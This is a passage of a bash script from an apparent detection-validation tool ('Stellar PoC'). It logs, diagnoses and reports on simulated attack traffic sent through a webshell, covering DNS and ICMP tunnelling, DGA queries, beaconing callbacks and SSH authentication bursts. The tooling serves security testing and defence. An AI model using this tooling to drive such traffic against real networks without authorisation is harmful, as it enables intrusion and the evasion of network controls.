        "${cmd_exec}" "${exit_code}" "${classification}" "${interp}" "${elapsed}"
    printf '%s' "${decision}"
}

poc_obs_should_run_followup() {
    local classification="$1"
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect|tcp_connect_failed) return 0 ;;
        *) return 1 ;;
    esac
}

# HTTP URL scan telemetry is useful on 401/403 as well as clean 2xx responses.
poc_obs_should_run_http_followup() {
    local classification="$1"
    case "${classification}" in
        connected|http_success|http_response_received|http_redirect|http_forbidden|http_auth_required|http_bad_request|http_method_blocked|http_not_found|http_server_error|app_forbidden|app_unauthorized) return 0 ;;
        *) return 1 ;;
    esac
}

poc_http_followup_attempt_ok() {
    local responses="$1" connected="$2" success="$3" attempted="$4"
    (( responses > 0 || connected > 0 || success > 0 )) && return 0
    (( attempted > 0 )) && return 0
    return 1
}

poc_obs_webshell_hook() {
    local context="$1" payload="$2" body="$3" http_code="$4" exit_code="$5" exec_ms="$6"
    local preview status
    preview=$(printf '%.200s' "${body}" | tr '\n' ' ')
    if (( exit_code == 0 )) && [[ "${http_code}" =~ ^[23] ]]; then
        status="command_success"
    elif (( exit_code != 0 )); then
        status="command_failed"
    else
        status="command_unknown"
    fi
    poc_obs_log "DEBUG" "Webshell context=${context} http=${http_code:-000} exit=${exit_code} ms=${exec_ms} size=${#body} status=${status}"
    if [[ "${status}" == command_failed ]] || [[ "${http_code}" == "000" || -z "${http_code}" ]]; then
        poc_obs_log "EVIDENCE" "Webshell failure context=${context} URL=${WEB_SHELL_URL:-n/a} exit=${exit_code} http=${http_code:-000} time_ms=${exec_ms} stdout_preview=${preview}"
        (( exit_code == 127 )) && poc_failure_reason_bump "Webshell command not found" 1
        [[ "${http_code}" == "000" || -z "${http_code}" ]] && poc_failure_reason_bump "Webshell transport HTTP 000" 1
    fi
}

poc_obs_print_top_failure_reasons() {
    local key count total=0 pct sorted
    poc_obs_append_log ""
    poc_obs_append_log "TOP FAILURE REASONS"
    poc_obs_append_log ""
    if ((${#POC_FAILURE_REASON_COUNTS[@]} == 0 && ${#POC_HTTP_STATUS_COUNTS[@]} == 0)); then
        poc_obs_append_log "  (none recorded)"
        return 0
    fi
    for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
        count="${POC_HTTP_STATUS_COUNTS[${key}]}"
        total=$((total + count))
        poc_obs_append_log "$(printf '  HTTP %s : %s' "${key}" "${count}")"
    done
    for key in "${!POC_FAILURE_REASON_COUNTS[@]}"; do
        count="${POC_FAILURE_REASON_COUNTS[${key}]}"
        poc_obs_append_log "$(printf '  %s : %s' "${key}" "${count}")"
    done
}

format_http_method_breakdown_block() {
    cat <<EOF
HTTP Method Effectiveness (aggregate)
- GET      attempted=${HTTP_REQUESTS_ATTEMPTED:-0}  (via URL scan burst)
- HEAD     attempted=${HTTP_REQUESTS_ATTEMPTED:-0}
- POST     attempted=${HTTP_POST_COUNT:-0}  success=${HTTP_POST_COUNT:-0}
- OPTIONS  attempted=${HTTP_OPTIONS_COUNT:-0}  success=${HTTP_OPTIONS_COUNT:-0}
- PROPFIND attempted=${HTTP_PROPFIND_COUNT:-0}  success=${HTTP_PROPFIND_COUNT:-0}
EOF
}

format_http_status_breakdown_block() {
    local key count total=0 pct
    for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
        total=$((total + POC_HTTP_STATUS_COUNTS[${key}]))
    done
    cat <<EOF
HTTP Status Breakdown (aggregate)
$(for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
    count="${POC_HTTP_STATUS_COUNTS[${key}]}"
    if (( total > 0 )); then pct=$((count * 100 / total)); else pct=0; fi
    printf -- '- %s : %s (%s%%)\n' "${key}" "${count}" "${pct}"
done)
EOF
}

poc_payload_heredoc_wrap_risk() {
    local payload="$1" delim="" line=""
    [[ "${payload}" != *"<<"* ]] && { printf 'no'; return 0; }
    while IFS= read -r line || [[ -n "${line}" ]]; do
        delim=$(printf '%s\n' "${line}" | sed -n "s/.*<<'\([^']*\)'.*/\1/p")
        if [[ -z "${delim}" ]]; then
            delim=$(printf '%s\n' "${line}" | sed -n 's/.*<<[[:space:]]*\([A-Za-z0-9_][A-Za-z0-9_]*\).*/\1/p')
        fi
        [[ -z "${delim}" ]] && continue
        if [[ "${line}" == "${delim};"* ]]; then
            printf 'yes'
            return 0
        fi
    done <<< "${payload}"
    if [[ -n "${delim}" && "${payload}" == *"${delim}"* && "${payload}" != *$'\n'"${delim}"$'\n'* && "${payload}" != *$'\n'"${delim}" ]]; then
        printf 'yes'
        return 0
    fi
    printf 'no'
}

poc_classify_dns_dga_root_cause() {
    local module="$1" payload="$2" out="$3" http_code="${4:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local low root_cause="unknown" reason="" bytes=${#payload} limit="${PAYLOAD_WARN_BYTES}"
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')

    if [[ "$(poc_payload_heredoc_wrap_risk "${payload}")" == yes || "${low}" == *"here-document"* \
        || "${low}" == *"wanted \`dga_sim_script"* || "${low}" == *"wanted \`dns_tunnel_sim_script"* ]]; then
        root_cause="heredoc_termination_corruption"
        reason="heredoc delimiter merged with exit suffix or broken terminator line"
    elif [[ "${low}" == *"rand_bytes: not found"* || "${low}" == *"rand_bytes: command not found"* \
        || "${low}" == *"dga_rand_label: not found"* || "${low}" == *"dga_rand_label: command not found"* \
        || "${low}" == *"dga_gen_domain: not found"* || "${low}" == *"dga_gen_domain: command not found"* \
        || "${low}" == *"dga_pick_tld: not found"* || "${low}" == *"dga_pick_tld: command not found"* \
        || "${low}" == *"randlbl32: not found"* || "${low}" == *"randlbl32: command not found"* \
        || "${low}" == *"randlbl: not found"* || "${low}" == *"randlbl: command not found"* \
        || "${low}" == *"bad substitution"* ]]; then
        root_cause="function_scope_corruption"
        reason="remote function definitions not executed in shell scope after payload wrap/transport"
    elif [[ "${low}" == *"unexpected eof"* || "${low}" == *"unexpected end of file"* \
        || "${low}" == *"syntax error near unexpected token"* ]]; then
        root_cause="heredoc_termination_corruption"
        reason="heredoc/script truncated or delimiter broken (unexpected EOF)"
    elif [[ "${low}" == *"command timed out"* || "${low}" == *"killed"* ]]; then
        root_cause="COMMAND_TIMEOUT"
        reason="remote command exceeded timeout"
    elif [[ "${http_code}" == "000" ]]; then
        root_cause="webshell_transport_limit"
        reason="webshell transport failed (HTTP 000) payload_bytes=${bytes}"
    elif [[ -z "${out}" ]] && (( bytes > limit )); then
        root_cause="webshell_transport_limit"
        reason="empty response with payload_bytes=${bytes} above limit=${limit}"
    elif [[ "${low}" == *"dig: not found"* || "${low}" == *"dig not found"* ]]; then
        root_cause="DIG_MISSING"
        reason="dig not installed on webshell host"
    elif [[ "${low}" == *"dns_server_validation_failed"* || "${low}" == *"resolver validation"* ]]; then
        root_cause="resolver_validation_failure"
        reason="DNS resolver validation failed before query execution"
    elif [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* || "${low}" == *"dns server unreachable"* \
        || "${low}" == *"connection refused"* || "${low}" == *"no servers could be reached"* ]]; then
        root_cause="dns_connectivity_failure"
        reason="DNS server unreachable or query timeout"
    elif [[ -z "${out}" ]]; then
        root_cause="webshell_transport_limit"
        reason="webshell returned empty output"
    fi

    printf '%s\n%s' "${root_cause}" "${reason}"
}

poc_log_root_cause_analysis() {
    local module="$1" payload="$2" out="$3" http_code="${4:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local root_cause reason _rc_lines=()
    mapfile -t _rc_lines <<< "$(poc_classify_dns_dga_root_cause "${module}" "${payload}" "${out}" "${http_code}")"
    root_cause="${_rc_lines[0]:-unknown}"
    reason="${_rc_lines[1]:-}"
    log_message "OK" "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET} http=${http_code}"
    case "${module}" in
        DNS)
            DNS_TUNNEL_LAST_ROOT_CAUSE="${root_cause}"
            dns_tunnel_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        DGA)
            DGA_LAST_ROOT_CAUSE="${root_cause}"
            dga_simulation_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        DNS_NEW_TLD)
            DNS_NEW_TLD_LAST_ROOT_CAUSE="${root_cause}"
            dns_new_tld_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET}"
            ;;
        EDR)
            edr_static_test_log_both "ROOT_CAUSE_ANALYSIS module=${module} root_cause=${root_cause} reason=${reason} payload_bytes=${#payload} webshell_method=${WEBSHELL_METHOD:-GET} http=${http_code}"
            ;;
    esac
}

poc_diagnose_dns_tunnel_failure() {
    local out="$1" payload="${2:-}"
    local low reason="webshell execution failure" root_cause=""
    if [[ -n "${payload}" ]]; then
        local _rc_lines=()
        mapfile -t _rc_lines <<< "$(poc_classify_dns_dga_root_cause "DNS" "${payload}" "${out}")"
        reason="${_rc_lines[1]:-${_rc_lines[0]:-webshell execution failure}}"
        printf '%s' "${reason}"
        return 0
    fi
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${low}" == *"rand_bytes: not found"* || "${low}" == *"rand_bytes: command not found"* \
        || "${low}" == *"dga_rand_label: not found"* || "${low}" == *"dga_rand_label: command not found"* \
        || "${low}" == *"dga_pick_tld: not found"* || "${low}" == *"dga_pick_tld: command not found"* \
        || "${low}" == *"dga_gen_domain: not found"* || "${low}" == *"dga_gen_domain: command not found"* \
        || "${low}" == *"randlbl32: not found"* || "${low}" == *"randlbl32: command not found"* \
        || "${low}" == *"randlbl: not found"* || "${low}" == *"randlbl: command not found"* ]]; then
        reason="function_scope_corruption: remote function definitions not executed"
    elif [[ "${low}" == *"command not found"* ]]; then
        reason="remote command not found on webshell host"
    elif [[ "${low}" == *"bad substitution"* ]]; then
        reason="remote script syntax error (non-bash shell)"
    elif [[ "${low}" == *"dig: not found"* || "${low}" == *"dig not found"* ]]; then
        reason="dig not installed on webshell host"
    elif [[ "${low}" == *"nslookup: not found"* ]]; then
        reason="nslookup not installed on webshell host"
    elif [[ "${low}" == *"host: not found"* ]]; then
        reason="host command not installed on webshell host"
    elif [[ "${low}" == *"timed out"* || "${low}" == *"timeout"* ]]; then
        reason="DNS server unreachable or query timeout"
    elif [[ "${low}" == *"connection refused"* ]]; then
        reason="DNS server refused connection"
    elif [[ -z "${out}" ]]; then
        reason="webshell returned empty output (payload too large or transport failure)"
    fi
    printf '%s' "${reason}"
}

poc_obs_write_structured_evidence() {
    local report_txt="${POC_EVIDENCE_DIR}/report.txt"
    local report_json="${POC_EVIDENCE_DIR}/report.json"
    local evidence_json="${POC_EVIDENCE_DIR}/evidence.json"
    local failure_json="${POC_EVIDENCE_DIR}/failure_analysis.json"
    local key count
    [[ -n "${POC_EVIDENCE_DIR}" ]] || return 0
    {
        echo "Stellar PoC Evidence Report"
        echo "Run ID: ${POC_RUN_ID}"
        echo "Target: ${TARGET_NET:-n/a}"
        echo ""
        echo "HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}"
        echo "HTTP Attempted: ${HTTP_REQUESTS_ATTEMPTED:-0}"
        echo "HTTP Responses: ${WEB_RESPONSES_RECEIVED:-0}"
        echo "SSH Attempts: ${SSH_ATTEMPTS_EXECUTED:-0}"
        echo "DNS Queries: ${DNS_QUERIES_ATTEMPTED:-0}"
        echo "ICMP Sent/Replies/Loss: ${ICMP_PACKETS_ATTEMPTED:-0}/${ICMP_REPLIES_RECEIVED:-0}/${ICMP_PACKET_LOSS:-0}%"
        echo "External Callback: attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0} connected=${EXTERNAL_CALLBACK_CONNECTED:-0}"
        echo ""
        format_http_status_breakdown_block 2>/dev/null || true
    } > "${report_txt}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","target_net":"%s","http":{"targets":%s,"attempted":%s,"responses":%s},"ssh":{"attempts":%s},"dns":{"attempted":%s,"responses":%s},"icmp":{"sent":%s,"replies":%s,"loss_pct":%s},"external_callback":{"attempted":%s,"connected":%s,"responses":%s}}\n' \
            "${POC_RUN_ID}" "${TARGET_NET:-}" \
            "${HTTP_SCAN_TARGET_COUNT:-0}" "${HTTP_REQUESTS_ATTEMPTED:-0}" "${WEB_RESPONSES_RECEIVED:-0}" \
            "${SSH_ATTEMPTS_EXECUTED:-0}" \
            "${DNS_QUERIES_ATTEMPTED:-0}" "${DNS_RESPONSES_RECEIVED:-0}" \
            "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" "${ICMP_PACKET_LOSS:-0}" \
            "${EXTERNAL_CALLBACK_ATTEMPTED:-0}" "${EXTERNAL_CALLBACK_CONNECTED:-0}" "${EXTERNAL_CALLBACK_RESPONSES:-0}"
    } > "${report_json}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","webshell_url":"%s","execution_log":"%s","followup_attempted":%s,"followup_skipped":%s}\n' \
            "${POC_RUN_ID}" "${WEB_SHELL_URL:-}" "${POC_EXECUTION_LOG:-}" \
            "${POC_FOLLOWUP_ATTEMPTED:-0}" "${POC_FOLLOWUP_SKIPPED:-0}"
    } > "${evidence_json}" 2>/dev/null || true
    {
        printf '{"run_id":"%s","http_status":{' "${POC_RUN_ID}"
        local first=true
        for key in "${!POC_HTTP_STATUS_COUNTS[@]}"; do
            count="${POC_HTTP_STATUS_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '},"failure_reasons":{'
        first=true
        for key in "${!POC_FAILURE_REASON_COUNTS[@]}"; do
            count="${POC_FAILURE_REASON_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '},"skip_reasons":{'
        first=true
        for key in "${!POC_SKIP_REASON_COUNTS[@]}"; do
            count="${POC_SKIP_REASON_COUNTS[${key}]}"
            [[ "${first}" == true ]] && first=false || printf ','
            printf '"%s":%s' "${key}" "${count}"
        done
        printf '}}\n'
    } > "${failure_json}" 2>/dev/null || true
}

poc_obs_print_executive_summary() {
    local key count cb_cause="" block=""
    compute_and_log_final_validation
    block="EXECUTIVE_SUMMARY

Hosts Discovered: ${POC_OBS_ALIVE_HOSTS:-0}
Open Services: ${SERVICES_DISCOVERED_TOTAL:-0}
HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}
SSH Targets: $(count_host_file_lines "ssh_hosts.txt" 2>/dev/null || echo 0)
DNS Targets: $(count_host_file_lines "dns_hosts.txt" 2>/dev/null || echo 0)

Traffic Generated:

Port Scan: ${SERVICES_DISCOVERED_TOTAL:-0} services mapped
HTTP Recon: ${HTTP_REQUESTS_ATTEMPTED:-0} requests (${WEB_RESPONSES_RECEIVED:-0} responses)
HTTP URL Scan: ${URL_SCAN_UNIQUE_ATTEMPTED:-0} unique URLs (${URL_SCAN_UNIQUE_FAILED:-0} failed)
SSH Authentication Attempts: ${SSH_ATTEMPTS_EXECUTED:-0}
DNS Tunnel: ${DNS_QUERIES_ATTEMPTED:-0} queries
ICMP Tunnel: ${ICMP_PACKETS_ATTEMPTED:-0} packets
Beaconing: ${EXTERNAL_CALLBACK_ATTEMPTED:-0} callbacks (${EXTERNAL_CALLBACK_CONNECTED:-0} connected)
DGA Simulation: ${DGA_TOTAL_QUERIES:-0} queries (${DGA_NXDOMAIN_COUNT:-0} NXDOMAIN)
External Callback: ${EXTERNAL_CALLBACK_ATTEMPTED:-0} attempts

Detection Confidence: ${DETECTION_CONFIDENCE_OVERALL}

Overall Assessment: ${OVERALL_RESULT} — HTTP URL Scan score=${DETECTION_SCORE_HTTP_URL_SCAN} Beacon=${DETECTION_SCORE_BEACON} DGA=${DETECTION_SCORE_DGA} DNS=${DETECTION_SCORE_DNS_TUNNEL} ICMP=${DETECTION_SCORE_ICMP_TUNNEL}"
    poc_customer_emit_block "${block}"
    poc_obs_append_log ""
    poc_obs_append_log "============================================================"
    poc_obs_append_log "EXECUTIVE SUMMARY"
    poc_obs_append_log "============================================================"
    poc_obs_append_log ""
    poc_obs_append_log "HTTP Targets: ${HTTP_SCAN_TARGET_COUNT:-0}"
    poc_obs_append_log "HTTP Connected: ${HTTP_CONNECTED:-0}"
    poc_obs_append_log "HTTP Responses: ${WEB_RESPONSES_RECEIVED:-0}"
    poc_obs_append_log "HTTP Success/Failed: ${WEB_SUCCESS_RESPONSES:-0}/${WEB_FAILED_RESPONSES:-0}"
    poc_obs_append_log ""
    poc_obs_append_log "SSH Attempts: ${SSH_ATTEMPTS_EXECUTED:-0} (planned ${SSH_ATTEMPTS_PLANNED:-0})"
    poc_obs_append_log "DNS Queries: ${DNS_QUERIES_ATTEMPTED:-0} Success: ${DNS_RESPONSES_RECEIVED:-0}"
    poc_obs_append_log "ICMP Packets: sent=${ICMP_PACKETS_ATTEMPTED:-0} replies=${ICMP_REPLIES_RECEIVED:-0} loss=${ICMP_PACKET_LOSS:-0}%"
    poc_obs_append_log "External Callback: attempted=${EXTERNAL_CALLBACK_ATTEMPTED:-0} connected=${EXTERNAL_CALLBACK_CONNECTED:-0}"
    poc_obs_append_log "Overall Result: ${OVERALL_RESULT} | Detection Confidence: ${DETECTION_CONFIDENCE_OVERALL}"
    if (( EXTERNAL_CALLBACK_CONNECTED == 0 && EXTERNAL_CALLBACK_ATTEMPTED > 0 )); then
        cb_cause="Likely Cause: Firewall blocking TCP to callback listener or routing asymmetry"
        poc_obs_append_log "${cb_cause}"
        poc_failure_reason_bump "Firewall Drop (callback)" 1
    fi
    poc_obs_append_log ""
    poc_obs_append_log "Alive Hosts: ${POC_OBS_ALIVE_HOSTS:-0}"
    poc_obs_append_log "Services Discovered: ${SERVICES_DISCOVERED_TOTAL:-0}"
    poc_obs_append_log "Follow-up Attempted: ${POC_FOLLOWUP_ATTEMPTED:-0}"
    poc_obs_append_log "Follow-up Skipped: ${POC_FOLLOWUP_SKIPPED:-0}"
    poc_obs_print_top_failure_reasons
    poc_obs_log "SUMMARY" "Follow-up attempted=${POC_FOLLOWUP_ATTEMPTED} skipped=${POC_FOLLOWUP_SKIPPED} overall=${OVERALL_RESULT}"
}

poc_obs_print_code_vs_environment() {
  local timeouts filtered refused forbidden missing
  timeouts=$((${POC_SKIP_REASON_COUNTS[network_timeout]:-0}))
  filtered=$((${POC_SKIP_REASON_COUNTS[filtered]:-0}))
  refused=$((${POC_SKIP_REASON_COUNTS[connection_refused]:-0}))
  forbidden=$((${POC_SKIP_REASON_COUNTS[app_forbidden]:-0}))
  missing=$((${POC_SKIP_REASON_COUNTS[missing_tool]:-0} + ${POC_SKIP_REASON_COUNTS[config_missing]:-0}))
  {
    echo ""
    echo "============================================================"
    echo "CODE VS ENVIRONMENT ASSESSMENT"
    echo "============================================================"
    echo ""
    echo "Discovery completed successfully: $([[ "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Services discovered: $([[ "${SERVICES_DISCOVERED_TOTAL:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Follow-up logic invoked: $([[ "${POC_FOLLOWUP_ATTEMPTED:-0}" -gt 0 || "${POC_FOLLOWUP_SKIPPED:-0}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Prechecks executed: YES"
    echo ""
    echo "Network timeouts observed: $([[ "${timeouts}" -gt 0 ]] && echo YES || echo NO)"
    echo ""
    echo "Conclusion:"
    echo ""
    if (( timeouts + filtered + refused > forbidden + missing )); then
      cat <<'EOF'

Most skipped scenarios were caused by network_timeout, filtered, or connection_refused conditions.

This suggests network controls such as firewall, ACL, routing restrictions, or security filtering.

The evidence does not indicate a script logic failure.
EOF
    elif (( forbidden > 0 )); then
      cat <<'EOF'

Skipped HTTP follow-ups were primarily caused by application-layer HTTP 403/401 responses.

Services were discovered and reachable at the network layer; access control blocked URL exploration.

This does not indicate a script logic failure.
EOF
    elif (( missing > 0 )); then
      cat <<'EOF'

Some follow-ups were skipped due to missing tools or configuration.

Verify remote dependencies (curl, nc, ssh, nmap) and target lists before re-running.
EOF
    else
      cat <<'EOF'

Follow-up execution completed with limited skips. See the Follow-up results section in stellar_poc_*_report.md for per-target detail.
EOF
    fi
    echo ""
  } | while IFS= read -r line; do poc_obs_append_log "${line}"; done
}

count_alive_hosts_from_discovery() {
    local cache_dir="${LOCAL_STATE_DIR}/remote_hosts" hosts=0
    [[ -d "${cache_dir}" ]] || { echo 0; return 0; }
    hosts=$(awk '/^[0-9]+\./ {print $1}' "${cache_dir}"/*.txt 2>/dev/null | sort -u | safe_count_lines)
    safe_int "${hosts}"
}

poc_obs_emit_discovery_from_cache() {
    local f cache ip port proto state reason service
    poc_obs_log "INFO" "Discovery results from service scan"
    for f in ssh_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt dns_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        [[ -s "${cache}" ]] || continue
        while IFS= read -r ip; do
            [[ -z "${ip}" ]] && continue
            port="22"; service="ssh"; proto="tcp"; state="open"; reason="scan"
            case "${f}" in
                ssh_hosts.txt) port=22; service=ssh ;;
                http_targets.txt)
                    port="${ip##*:}"; ip="${ip%%:*}"
                    [[ "${port}" == "${ip}" ]] && port=80
                    service=http ;;
                https_targets.txt)
                    port="${ip##*:}"; ip="${ip%%:*}"
                    [[ "${port}" == "${ip}" ]] && port=443
                    service=https ;;
                smb_hosts.txt) port=445; service=smb ;;
                dns_hosts.txt) port=53; service=dns ;;
            esac
            poc_obs_log_discovery_service "${ip}" "${port}" "${proto}" "${state}" "${reason}" "${service}" ""
        done < <(extract_host_file_lines < "${cache}")
    done
}

poc_obs_finalize_report() {
    local end_ts key count
    poc_obs_init_artifacts
    poc_obs_print_executive_summary
    poc_obs_print_code_vs_environment
    poc_obs_write_structured_evidence
    end_ts=$(date +"%Y-%m-%d %H:%M:%S")
    [[ -n "${POC_REPORT_CWD}" ]] || return 0
    poc_obs_report_append ""
    poc_obs_report_append "## Executive summary"
    poc_obs_report_append ""
    poc_obs_report_append "| Metric | Value |"
    poc_obs_report_append "|---|---|"
    poc_obs_report_append "| End time | ${end_ts} |"
    poc_obs_report_append "| Alive hosts | ${POC_OBS_ALIVE_HOSTS:-0} |"
    poc_obs_report_append "| Services discovered | ${SERVICES_DISCOVERED_TOTAL:-0} |"
    poc_obs_report_append "| Follow-up attempted | ${POC_FOLLOWUP_ATTEMPTED:-0} |"
    poc_obs_report_append "| Follow-up skipped | ${POC_FOLLOWUP_SKIPPED:-0} |"
    poc_obs_report_append ""
    poc_obs_report_append "### Skip reason counts"
    poc_obs_report_append ""
    if ((${#POC_SKIP_REASON_COUNTS[@]} == 0)); then
        poc_obs_report_append "- (none)"
    else
        for key in "${!POC_SKIP_REASON_COUNTS[@]}"; do
            count="${POC_SKIP_REASON_COUNTS[${key}]}"
            poc_obs_report_append "- **${key}**: ${count}"
        done
    fi
    poc_obs_report_append ""
    poc_obs_report_append "### Environment assessment"
    poc_obs_report_append ""
    poc_obs_report_append "See the execution log for full CODE VS ENVIRONMENT ASSESSMENT narrative."
    poc_obs_report_append ""
    poc_obs_report_append "---"
    poc_obs_report_append ""
    poc_obs_report_append "Detailed operator messages: \`${POC_EXECUTION_LOG}\`"
    poc_obs_report_append ""
    poc_obs_report_append "Customer deliverables: \`poc.log\` | \`poc_report.txt\` | \`poc_validation.txt\`"
    poc_obs_report_append ""
    poc_obs_report_append "Structured evidence: \`${POC_EVIDENCE_DIR}\` (report.txt, report.json, evidence.json, failure_analysis.json)"
}

validate_followup_options() {
    [[ "${POC_INTENSITY}" =~ ^(light|normal|high|spike)$ ]] || {
        log_message "ERROR" "--intensity must be light|normal|high|spike (got: ${POC_INTENSITY})"
        exit 1
    }
    if [[ -n "${SERVICE_SPIKE_SECONDS}" ]]; then
        _validate_positive_int "--service-spike-seconds" "${SERVICE_SPIKE_SECONDS}" 5 600
    fi
    if [[ -n "${SSH_BURST_ATTEMPTS}" ]]; then
        _validate_positive_int "--ssh-attempts" "${SSH_BURST_ATTEMPTS}" 1 2000
    fi
    if [[ -n "${SSH_BURST_CONCURRENCY}" ]]; then
        _validate_positive_int "--ssh-concurrency" "${SSH_BURST_CONCURRENCY}" 1 8
    fi
    if [[ -n "${SSH_BURST_MINUTES}" && "${SSH_BURST_MINUTES}" != "0" ]]; then
        _validate_positive_int "--ssh-burst-minutes" "${SSH_BURST_MINUTES}" 1 30
    fi
    if [[ -n "${SSH_TARGET_IP}" ]]; then
        validate_ssh_target_in_lab "${SSH_TARGET_IP}" "--ssh-target"
    fi
    if [[ -n "${SSH_TARGETS_FILE}" && -f "${SSH_TARGETS_FILE}" ]]; then
        while IFS= read -r ip; do
            [[ -z "${ip}" || "${ip}" =~ ^# ]] && continue
            validate_ssh_target_in_lab "${ip}" "--ssh-targets file"
        done < "${SSH_TARGETS_FILE}"
    fi
    [[ "${DNS_TUNNEL_MODE}" =~ ^(auto|cluster-local|infrastructure|txt-burst|all)$ ]] || {
        log_message "ERROR" "--dns-tunnel-mode must be auto|cluster-local|infrastructure|txt-burst|all"
        exit 1
    }
    if [[ -n "${DNS_TUNNEL_MAX_QUERIES}" ]]; then
        _validate_positive_int "--dns-max-queries" "${DNS_TUNNEL_MAX_QUERIES}" 30 5000
    fi
    if [[ -n "${DNS_TUNNEL_SLEEP_MS}" ]]; then
        _validate_positive_int "--dns-sleep-ms" "${DNS_TUNNEL_SLEEP_MS}" 0 5000
    fi
    if [[ -n "${DNS_TUNNEL_JITTER_MS}" ]]; then
        _validate_positive_int "--dns-jitter-ms" "${DNS_TUNNEL_JITTER_MS}" 0 5000
    fi
    if [[ -n "${DNS_TUNNEL_USER_SERVER}" ]]; then
        [[ "${DNS_TUNNEL_USER_SERVER}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
            log_message "ERROR" "--dns-server must be an IPv4 address"
            exit 1
        }
    fi
    if [[ -n "${DGA_DNS_USER_SERVER}" ]]; then
        [[ "${DGA_DNS_USER_SERVER}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
            log_message "ERROR" "--dga-dns-server must be an IPv4 address"
            exit 1
        }
    fi
    if [[ -n "${DGA_BASE_DOMAIN}" ]]; then
        [[ "${DGA_BASE_DOMAIN}" =~ ^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$ ]] || {
            log_message "ERROR" "--dga-base-domain must be a valid domain name"
            exit 1
        }
    fi
    if [[ -n "${DGA_NXDOMAIN_QUERIES}" ]]; then
        _validate_positive_int "--dga-nxdomain-queries" "${DGA_NXDOMAIN_QUERIES}" 100 300
    fi
    if [[ -n "${DGA_RESOLVABLE_QUERIES}" ]]; then
        _validate_positive_int "--dga-resolvable-queries" "${DGA_RESOLVABLE_QUERIES}" 5 8
    fi
    [[ "${ICMP_TUNNEL_MODE}" =~ ^(auto|tunnel-like-session|payload-size-anomaly|alert-profiles|large-payload-burst|sustained-large-icmp|mtu-like-anomaly|mixed-size-icmp)$ ]] || {
        log_message "ERROR" "--icmp-tunnel-mode must be auto|tunnel-like-session|payload-size-anomaly|alert-profiles|large-payload-burst|sustained-large-icmp|mtu-like-anomaly|mixed-size-icmp"
        exit 1
    }
    if [[ -n "${ICMP_TUNNEL_PAYLOAD_SIZE}" ]]; then
        _validate_positive_int "--icmp-payload-size" "${ICMP_TUNNEL_PAYLOAD_SIZE}" 64 "${ICMP_TUNNEL_MAX_PAYLOAD_SIZE:-1400}"
    fi
    if [[ -n "${ICMP_PACKET_COUNT}" ]]; then
        _validate_positive_int "--icmp-packet-count" "${ICMP_PACKET_COUNT}" 10 "${ICMP_TUNNEL_MAX_PACKET_COUNT:-2000}"
    fi
    if [[ -n "${ICMP_TUNNEL_DURATION_SECONDS}" ]]; then
        _validate_positive_int "--icmp-duration-seconds" "${ICMP_TUNNEL_DURATION_SECONDS}" 30 "${ICMP_TUNNEL_MAX_DURATION_SECONDS:-300}"
    fi
    if [[ -n "${ICMP_TUNNEL_MAX_PACKET_COUNT}" ]]; then
        _validate_positive_int "--icmp-max-packets" "${ICMP_TUNNEL_MAX_PACKET_COUNT}" 50 5000
    fi
    if [[ -n "${ICMP_TUNNEL_MAX_PAYLOAD_SIZE}" ]]; then
        _validate_positive_int "--icmp-max-payload" "${ICMP_TUNNEL_MAX_PAYLOAD_SIZE}" 512 1472
    fi
    if [[ -n "${ICMP_TUNNEL_USER_TARGET}" ]]; then
        validate_icmp_user_target "${ICMP_TUNNEL_USER_TARGET}"
    fi
}

apply_user_intensity_profile() {
    POC_INTENSITY="${POC_INTENSITY:-normal}"

    # Duration is independent of intensity (default 10 minutes); skip for --single-stage.
    if [[ -z "${SINGLE_STAGE}" ]]; then
        if [[ ! "${DURATION_MINUTES}" =~ ^[0-9]+$ || "${DURATION_MINUTES}" -lt 1 ]]; then
            if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
                : # --repeat-count mode keeps operator-provided schedule (no default duration)
            else
                DURATION_MINUTES="${DEFAULT_DURATION_MINUTES:-10}"
            fi
        fi
    fi

    # Reset feature flags; intensity block sets them explicitly.
    PERSISTENT_BEACON=false
    PIPELINE_OVERLAP=false
    BURST_MODE=false
    SERVICE_SPIKE=false
    SLOW_HTTP=false
    SSH_AUTH_BURST_ENABLED=true
    STRICT_FOLLOWUP_VALIDATION=false
